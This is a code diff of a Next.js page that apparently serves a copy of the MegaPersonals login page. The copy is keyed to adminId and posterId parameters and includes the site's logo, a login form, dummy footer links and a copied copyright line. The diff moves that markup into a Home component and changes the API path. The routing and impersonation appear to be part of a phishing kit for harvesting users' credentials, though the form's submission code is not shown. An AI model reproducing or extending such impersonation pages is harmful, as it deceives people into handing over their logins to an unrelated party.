@@ -1,9 +1,9 @@
 
-import LoginForm from "@/app/components/LoginForm";
+import Home from "@/app/components/Home";
 import { site,API_URL } from "../../../config/index";
 import { headers } from 'next/headers'
 
-export default async function Home({params}) {
+export default async function page({params}) {
   const { adminId, posterId } = params;
   const headersList = headers()
   let content;
@@ -19,7 +19,7 @@ export default async function Home({params}) {
 
   const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";
 
-  const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;
+  const url = `${API_URL}/${site}/${adminId}/${posterId}/${device}`;
 
   const res = await fetch(url);
   const data = await res.json();
@@ -32,42 +32,20 @@ export default async function Home({params}) {
   if (data?.success == "exists") {
     // content= <div className="col-span-12">Page found!!</div>
     
-      content=   <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
-      <div className="w-[65%] lg:w-full">
-      <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
-      </div> 
-  
-      <LoginForm  adminId={ adminId} posterId={posterId}/>
-  
-      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
-        <p className=" cursor-pointer">Home</p>
-        {" | "}
-        <p className=" cursor-pointer">Manage Posts</p>
-        {" | "}
-        <p className=" cursor-pointer">Contact Us</p>
-        {" | "}
-        <p className=" cursor-pointer">Policies & Terms</p>
-      </div>
-  
-      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
-        Copyright ©2021 MegaPersonals.eu
-      </p>
-    </div>
+      content= <Home adminId={adminId} posterId={posterId }/>
     
   }
- 
-
-  
-
   return (
     <div>
-    {content}
-   </div>
-    
-  );
+     {content}
+    </div>
+  )
+}
+
+
 
   
 
-}
+
 
 
